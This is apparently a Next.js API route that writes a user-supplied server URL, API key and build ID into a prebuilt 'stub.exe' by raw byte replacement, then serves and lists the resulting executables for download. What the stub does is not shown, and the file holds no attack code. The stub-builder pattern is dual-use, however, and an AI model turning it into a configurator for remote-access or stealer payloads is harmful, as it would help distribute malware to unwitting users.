import { NextRequest, NextResponse } from 'next/server';
import { writeFile, readFile, mkdir } from 'fs/promises';
import { existsSync } from 'fs';
import path from 'path';
import crypto from 'crypto';
import { cookies } from 'next/headers';
import { verifyToken } from '@/lib/auth';
import { ActivityLogger } from '@/lib/activity-logger';

export async function POST(request: NextRequest) {
  try {
    // Check authentication
    const cookieStore = await cookies();
    const token = cookieStore.get('auth-token')?.value;

    if (!token) {
      return NextResponse.json(
        { success: false, message: 'Not authenticated' },
        { status: 401 }
      );
    }

    const payload = verifyToken(token);
    if (!payload) {
      return NextResponse.json(
        { success: false, message: 'Invalid token' },
        { status: 401 }
      );
    }

    const { config, buildId } = await request.json();

    if (!config || !buildId) {
      return NextResponse.json(
        { success: false, message: 'Configuration and build ID are required' },
        { status: 400 }
      );
    }

    // Paths
    const stubPath = path.join(process.cwd(), 'stub.exe');
    const buildsDir = path.join(process.cwd(), 'public', 'builds');
    const buildFilename = `build_${buildId}.exe`;
    const buildPath = path.join(buildsDir, buildFilename);

    // Check if stub.exe exists
    if (!existsSync(stubPath)) {
      return NextResponse.json(
        { success: false, message: 'Base stub.exe not found. Please ensure stub.exe is built and available.' },
        { status: 404 }
      );
    }

    // Create builds directory if it doesn't exist
    if (!existsSync(buildsDir)) {
      await mkdir(buildsDir, { recursive: true });
    }

    // Read the original stub.exe
    const stubBuffer = await readFile(stubPath);

    // Clone the buffer for modification
    let modifiedBuffer = Buffer.from(stubBuffer);

    // Resource section modification approach
    // This is a simplified approach - in production you'd want to use proper PE modification
    const configBytes = Buffer.from(config, 'utf-8');
    const configWithPadding = Buffer.alloc(512); // Fixed size for resource
    configBytes.copy(configWithPadding);

    // Find and replace the default configuration in the resource section
    // This is a simple string replacement approach
    const defaultConfig = Buffer.from('SERVER_URL=http://localhost:3000;API_KEY=default-key;BUILD_ID=default-build;DEBUG=0', 'utf-8');
    const searchBuffer = Buffer.alloc(512);
    defaultConfig.copy(searchBuffer);

    // Find the position of the default config in the stub
    const configPosition = modifiedBuffer.indexOf(searchBuffer.subarray(0, defaultConfig.length));
    
    if (configPosition !== -1) {
      // Replace the configuration
      configWithPadding.copy(modifiedBuffer, configPosition, 0, Math.min(configWithPadding.length, modifiedBuffer.length - configPosition));
      console.log(`Replaced configuration at position ${configPosition}`);
    } else {
      // If we can't find the exact match, try a more flexible approach
      const markerSearch = Buffer.from('SERVER_URL=', 'utf-8');
      const markerPosition = modifiedBuffer.indexOf(markerSearch);
      
      if (markerPosition !== -1) {
        // Found the marker, replace from here
        const maxConfigLength = Math.min(500, modifiedBuffer.length - markerPosition);
        const newConfigBuffer = Buffer.from(config.padEnd(maxConfigLength, '\0'), 'utf-8');
        newConfigBuffer.copy(modifiedBuffer, markerPosition, 0, maxConfigLength);
        console.log(`Replaced configuration at marker position ${markerPosition}`);
      } else {
        console.warn('Could not find configuration section in stub.exe - using as-is');
      }
    }

    // Write the modified executable
    await writeFile(buildPath, modifiedBuffer);

    // Log the build activity
    await ActivityLogger.logActivity(
      'executable.built',
      `Built executable: ${buildFilename}`,
      {
        userId: payload.userId,
        userEmail: payload.email,
        metadata: {
          buildId,
          filename: buildFilename,
          configLength: config.length
        },
        severity: 'success'
      }
    );

    return NextResponse.json({
      success: true,
      message: 'Executable built successfully',
      filename: buildFilename,
      downloadUrl: `/builds/${buildFilename}`,
      buildId: buildId,
      size: modifiedBuffer.length
    });

  } catch (error) {
    console.error('Build error:', error);
    return NextResponse.json(
      { success: false, message: 'Failed to build executable: ' + (error as Error).message },
      { status: 500 }
    );
  }
}

// GET endpoint to list available builds
export async function GET() {
  try {
    const cookieStore = await cookies();
    const token = cookieStore.get('auth-token')?.value;

    if (!token) {
      return NextResponse.json(
        { success: false, message: 'Not authenticated' },
        { status: 401 }
      );
    }

    const payload = verifyToken(token);
    if (!payload) {
      return NextResponse.json(
        { success: false, message: 'Invalid token' },
        { status: 401 }
      );
    }

    const buildsDir = path.join(process.cwd(), 'public', 'builds');
    
    if (!existsSync(buildsDir)) {
      return NextResponse.json({
        success: true,
        builds: []
      });
    }

    const fs = await import('fs/promises');
    const files = await fs.readdir(buildsDir);
    const builds = [];

    for (const file of files) {
      if (file.endsWith('.exe')) {
        const filePath = path.join(buildsDir, file);
        const stats = await fs.stat(filePath);
        
        builds.push({
          filename: file,
          size: stats.size,
          created: stats.birthtime.toISOString(),
          downloadUrl: `/builds/${file}`
        });
      }
    }

    // Sort by creation time (newest first)
    builds.sort((a, b) => new Date(b.created).getTime() - new Date(a.created).getTime());

    return NextResponse.json({
      success: true,
      builds
    });

  } catch (error) {
    console.error('Failed to list builds:', error);
    return NextResponse.json(
      { success: false, message: 'Failed to list builds' },
      { status: 500 }
    );
  }
}